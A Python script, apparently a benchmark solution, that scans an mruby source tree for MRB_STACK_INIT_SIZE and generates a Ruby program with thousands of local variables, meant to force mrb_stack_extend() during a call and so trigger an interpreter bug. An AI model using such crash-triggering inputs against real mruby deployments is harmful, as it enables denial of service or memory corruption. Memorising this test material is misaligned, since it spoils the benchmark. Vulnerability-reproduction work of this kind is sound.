import os
import re
import tarfile
from typing import Optional, Iterable


class Solution:
    def _read_text_files_from_dir(self, root: str) -> Iterable[str]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not (fn.endswith(".h") or fn.endswith(".c") or fn.endswith(".cpp") or fn.endswith(".cc")):
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    if os.path.getsize(p) > 2_000_000:
                        continue
                    with open(p, "rb") as f:
                        data = f.read(300_000)
                    yield data.decode("utf-8", "ignore")
                except Exception:
                    continue

    def _read_text_files_from_tar(self, tar_path: str) -> Iterable[str]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                members = tf.getmembers()
                preferred_suffixes = (
                    "include/mruby.h",
                    "include/mruby/config.h",
                    "include/mruby/common.h",
                    "src/vm.c",
                    "src/vm.cxx",
                    "src/state.c",
                    "src/proc.c",
                )

                def iter_members(pref_only: bool):
                    for m in members:
                        if not m.isfile():
                            continue
                        name = m.name.replace("\\", "/")
                        if pref_only:
                            if not any(name.endswith(s) for s in preferred_suffixes):
                                continue
                        else:
                            base = os.path.basename(name)
                            if not (base.endswith(".h") or base.endswith(".c") or base.endswith(".cpp") or base.endswith(".cc")):
                                continue
                        if m.size > 2_000_000:
                            continue
                        yield m

                for phase in (True, False):
                    scanned = 0
                    for m in iter_members(phase):
                        scanned += 1
                        if not phase and scanned > 600:
                            return
                        try:
                            f = tf.extractfile(m)
                            if not f:
                                continue
                            data = f.read(300_000)
                            yield data.decode("utf-8", "ignore")
                        except Exception:
                            continue
        except Exception:
            return

    def _detect_stack_init_size(self, src_path: str) -> int:
        patterns = [
            re.compile(r"#\s*define\s+MRB_STACK_INIT_SIZE\s*\(?\s*(\d+)\s*\)?"),
            re.compile(r"\bMRB_STACK_INIT_SIZE\b\s*=\s*(\d+)\b"),
        ]

        def search_texts(texts: Iterable[str]) -> Optional[int]:
            for txt in texts:
                if "MRB_STACK_INIT_SIZE" not in txt:
                    continue
                for pat in patterns:
                    m = pat.search(txt)
                    if m:
                        try:
                            v = int(m.group(1))
                            if 16 <= v <= 1_000_000:
                                return v
                        except Exception:
                            pass
            return None

        if os.path.isfile(src_path):
            v = search_texts(self._read_text_files_from_tar(src_path))
            if v is not None:
                return v
        elif os.path.isdir(src_path):
            v = search_texts(self._read_text_files_from_dir(src_path))
            if v is not None:
                return v
        return 128

    def _base36(self, n: int) -> str:
        if n == 0:
            return "0"
        digits = "0123456789abcdefghijklmnopqrstuvwxyz"
        out = []
        while n:
            n, r = divmod(n, 36)
            out.append(digits[r])
        return "".join(reversed(out))

    def solve(self, src_path: str) -> bytes:
        init_sz = self._detect_stack_init_size(src_path)

        # Heuristic to force mrb_stack_extend() during a method call.
        # Keep it bounded to avoid excessive compile/runtime overhead.
        local_count = init_sz * 8 + 64
        if local_count < 1024:
            local_count = 1024
        if local_count > 12000:
            local_count = 12000

        assigns = []
        # Use distinct local variables to inflate nregs of the callee irep.
        for i in range(local_count):
            assigns.append("v" + self._base36(i) + "=0;")

        code = "def g;" + "".join(assigns) + "0;end;def h;g;end;h\n"
        return code.encode("utf-8", "strict")